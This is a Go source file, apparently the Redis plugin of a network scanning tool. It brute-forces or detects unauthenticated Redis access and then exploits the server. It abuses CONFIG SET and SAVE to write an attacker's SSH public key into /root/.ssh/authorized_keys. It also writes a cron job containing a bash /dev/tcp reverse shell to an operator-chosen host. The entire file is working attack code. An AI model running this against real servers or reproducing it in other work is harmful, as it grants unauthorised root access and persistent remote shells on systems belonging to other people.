package Plugins

import (
	"bufio"
	"fmt"
	"github.com/AgonySec/fscan/Configs"
	"io"
	"net"
	"os"
	"strings"
	"time"
)

var (
	dbfilename string
	dir        string
)

func RedisScan(info *Configs.HostInfo) (tmperr error) {
	starttime := time.Now().Unix()
	flag, err := RedisUnauth(info)
	if flag == true && err == nil {
		return err
	}
	if Configs.IsBrute {
		return
	}
	for _, pass := range Configs.Passwords {
		pass = strings.Replace(pass, "{user}", "redis", -1)
		flag, err := RedisConn(info, pass)
		if flag == true && err == nil {
			return err
		} else {
			errlog := fmt.Sprintf("[-] redis %v:%v %v %v", info.Host, info.Ports, pass, err)
			Configs.LogError(errlog)
			tmperr = err
			if Configs.CheckErrs(err) {
				return err
			}
			if time.Now().Unix()-starttime > (int64(len(Configs.Passwords)) * Configs.Timeout) {
				return err
			}
		}
	}
	return tmperr
}

func RedisConn(info *Configs.HostInfo, pass string) (flag bool, err error) {
	flag = false
	realhost := fmt.Sprintf("%s:%v", info.Host, info.Ports)
	conn, err := Configs.WrapperTcpWithTimeout("tcp", realhost, time.Duration(Configs.Timeout)*time.Second)
	if err != nil {
		return flag, err
	}
	defer conn.Close()
	err = conn.SetReadDeadline(time.Now().Add(time.Duration(Configs.Timeout) * time.Second))
	if err != nil {
		return flag, err
	}
	_, err = conn.Write([]byte(fmt.Sprintf("auth %s\r\n", pass)))
	if err != nil {
		return flag, err
	}
	reply, err := readreply(conn)
	if err != nil {
		return flag, err
	}
	if strings.Contains(reply, "+OK") {
		flag = true
		dbfilename, dir, err = getconfig(conn)
		if err != nil {
			result := fmt.Sprintf("[+] Redis %s %s", realhost, pass)
			Configs.LogSuccess(result)
			return flag, err
		} else {
			result := fmt.Sprintf("[+] Redis %s %s file:%s/%s", realhost, pass, dir, dbfilename)
			Configs.LogSuccess(result)
		}
		err = Expoilt(realhost, conn)
	}
	return flag, err
}

func RedisUnauth(info *Configs.HostInfo) (flag bool, err error) {
	flag = false
	realhost := fmt.Sprintf("%s:%v", info.Host, info.Ports)
	conn, err := Configs.WrapperTcpWithTimeout("tcp", realhost, time.Duration(Configs.Timeout)*time.Second)
	if err != nil {
		return flag, err
	}
	defer conn.Close()
	err = conn.SetReadDeadline(time.Now().Add(time.Duration(Configs.Timeout) * time.Second))
	if err != nil {
		return flag, err
	}
	_, err = conn.Write([]byte("info\r\n"))
	if err != nil {
		return flag, err
	}
	reply, err := readreply(conn)
	if err != nil {
		return flag, err
	}
	if strings.Contains(reply, "redis_version") {
		flag = true
		dbfilename, dir, err = getconfig(conn)
		if err != nil {
			result := fmt.Sprintf("[+] Redis %s unauthorized", realhost)
			Configs.LogSuccess(result)
			return flag, err
		} else {
			result := fmt.Sprintf("[+] Redis %s unauthorized file:%s/%s", realhost, dir, dbfilename)
			Configs.LogSuccess(result)
		}
		err = Expoilt(realhost, conn)
	}
	return flag, err
}

func Expoilt(realhost string, conn net.Conn) error {
	if Configs.Noredistest {
		return nil
	}
	flagSsh, flagCron, err := testwrite(conn)
	if err != nil {
		return err
	}
	if flagSsh == true {
		result := fmt.Sprintf("[+] Redis %v like can write /root/.ssh/", realhost)
		Configs.LogSuccess(result)
		if Configs.RedisFile != "" {
			writeok, text, err := writekey(conn, Configs.RedisFile)
			if err != nil {
				fmt.Println(fmt.Sprintf("[-] %v SSH write key errer: %v", realhost, text))
				return err
			}
			if writeok {
				result := fmt.Sprintf("[+] Redis %v SSH public key was written successfully", realhost)
				Configs.LogSuccess(result)
			} else {
				fmt.Println("[-] Redis ", realhost, "SSHPUB write failed", text)
			}
		}
	}

	if flagCron == true {
		result := fmt.Sprintf("[+] Redis %v like can write /var/spool/cron/", realhost)
		Configs.LogSuccess(result)
		if Configs.RedisShell != "" {
			writeok, text, err := writecron(conn, Configs.RedisShell)
			if err != nil {
				return err
			}
			if writeok {
				result := fmt.Sprintf("[+] Redis %v /var/spool/cron/root was written successfully", realhost)
				Configs.LogSuccess(result)
			} else {
				fmt.Println("[-] Redis ", realhost, "cron write failed", text)
			}
		}
	}
	err = recoverdb(dbfilename, dir, conn)
	return err
}

func writekey(conn net.Conn, filename string) (flag bool, text string, err error) {
	flag = false
	_, err = conn.Write([]byte("CONFIG SET dir /root/.ssh/\r\n"))
	if err != nil {
		return flag, text, err
	}
	text, err = readreply(conn)
	if err != nil {
		return flag, text, err
	}
	if strings.Contains(text, "OK") {
		_, err := conn.Write([]byte("CONFIG SET dbfilename authorized_keys\r\n"))
		if err != nil {
			return flag, text, err
		}
		text, err = readreply(conn)
		if err != nil {
			return flag, text, err
		}
		if strings.Contains(text, "OK") {
			key, err := Readfile(filename)
			if err != nil {
				text = fmt.Sprintf("Open %s error, %v", filename, err)
				return flag, text, err
			}
			if len(key) == 0 {
				text = fmt.Sprintf("the keyfile %s is empty", filename)
				return flag, text, err
			}
			_, err = conn.Write([]byte(fmt.Sprintf("set x \"\\n\\n\\n%v\\n\\n\\n\"\r\n", key)))
			if err != nil {
				return flag, text, err
			}
			text, err = readreply(conn)
			if err != nil {
				return flag, text, err
			}
			if strings.Contains(text, "OK") {
				_, err = conn.Write([]byte("save\r\n"))
				if err != nil {
					return flag, text, err
				}
				text, err = readreply(conn)
				if err != nil {
					return flag, text, err
				}
				if strings.Contains(text, "OK") {
					flag = true
				}
			}
		}
	}
	text = strings.TrimSpace(text)
	if len(text) > 50 {
		text = text[:50]
	}
	return flag, text, err
}

func writecron(conn net.Conn, host string) (flag bool, text string, err error) {
	flag = false
	// 尝试写入Ubuntu的路径
	_, err = conn.Write([]byte("CONFIG SET dir /var/spool/cron/crontabs/\r\n"))
	if err != nil {
		return flag, text, err
	}
	text, err = readreply(conn)
	if err != nil {
		return flag, text, err
	}
	if !strings.Contains(text, "OK") {
		// 如果没有返回"OK"，可能是CentOS，尝试CentOS的路径
		_, err = conn.Write([]byte("CONFIG SET dir /var/spool/cron/\r\n"))
		if err != nil {
			return flag, text, err
		}
		text, err = readreply(conn)
		if err != nil {
			return flag, text, err
		}
	}
	if strings.Contains(text, "OK") {
		_, err = conn.Write([]byte("CONFIG SET dbfilename root\r\n"))
		if err != nil {
			return flag, text, err
		}
		text, err = readreply(conn)
		if err != nil {
			return flag, text, err
		}
		if strings.Contains(text, "OK") {
			target := strings.Split(host, ":")
			if len(target) < 2 {
				return flag, "host error", err
			}
			scanIp, scanPort := target[0], target[1]
			_, err = conn.Write([]byte(fmt.Sprintf("set xx \"\\n* * * * * bash -i >& /dev/tcp/%v/%v 0>&1\\n\"\r\n", scanIp, scanPort)))
			if err != nil {
				return flag, text, err
			}
			text, err = readreply(conn)
			if err != nil {
				return flag, text, err
			}
			if strings.Contains(text, "OK") {
				_, err = conn.Write([]byte("save\r\n"))
				if err != nil {
					return flag, text, err
				}
				text, err = readreply(conn)
				if err != nil {
					return flag, text, err
				}
				if strings.Contains(text, "OK") {
					flag = true
				}
			}
		}
	}
	text = strings.TrimSpace(text)
	if len(text) > 50 {
		text = text[:50]
	}
	return flag, text, err
}

func Readfile(filename string) (string, error) {
	file, err := os.Open(filename)
	if err != nil {
		return "", err
	}
	defer file.Close()
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		text := strings.TrimSpace(scanner.Text())
		if text != "" {
			return text, nil
		}
	}
	return "", err
}

func readreply(conn net.Conn) (string, error) {
	conn.SetReadDeadline(time.Now().Add(time.Second))
	bytes, err := io.ReadAll(conn)
	if len(bytes) > 0 {
		err = nil
	}
	return string(bytes), err
}

func testwrite(conn net.Conn) (flag bool, flagCron bool, err error) {
	var text string
	_, err = conn.Write([]byte("CONFIG SET dir /root/.ssh/\r\n"))
	if err != nil {
		return flag, flagCron, err
	}
	text, err = readreply(conn)
	if err != nil {
		return flag, flagCron, err
	}
	if strings.Contains(text, "OK") {
		flag = true
	}
	_, err = conn.Write([]byte("CONFIG SET dir /var/spool/cron/\r\n"))
	if err != nil {
		return flag, flagCron, err
	}
	text, err = readreply(conn)
	if err != nil {
		return flag, flagCron, err
	}
	if strings.Contains(text, "OK") {
		flagCron = true
	}
	return flag, flagCron, err
}

func getconfig(conn net.Conn) (dbfilename string, dir string, err error) {
	_, err = conn.Write([]byte("CONFIG GET dbfilename\r\n"))
	if err != nil {
		return
	}
	text, err := readreply(conn)
	if err != nil {
		return
	}
	text1 := strings.Split(text, "\r\n")
	if len(text1) > 2 {
		dbfilename = text1[len(text1)-2]
	} else {
		dbfilename = text1[0]
	}
	_, err = conn.Write([]byte("CONFIG GET dir\r\n"))
	if err != nil {
		return
	}
	text, err = readreply(conn)
	if err != nil {
		return
	}
	text1 = strings.Split(text, "\r\n")
	if len(text1) > 2 {
		dir = text1[len(text1)-2]
	} else {
		dir = text1[0]
	}
	return
}

func recoverdb(dbfilename string, dir string, conn net.Conn) (err error) {
	_, err = conn.Write([]byte(fmt.Sprintf("CONFIG SET dbfilename %s\r\n", dbfilename)))
	if err != nil {
		return
	}
	_, err = readreply(conn)
	if err != nil {
		return
	}
	_, err = conn.Write([]byte(fmt.Sprintf("CONFIG SET dir %s\r\n", dir)))
	if err != nil {
		return
	}
	_, err = readreply(conn)
	if err != nil {
		return
	}
	return
}
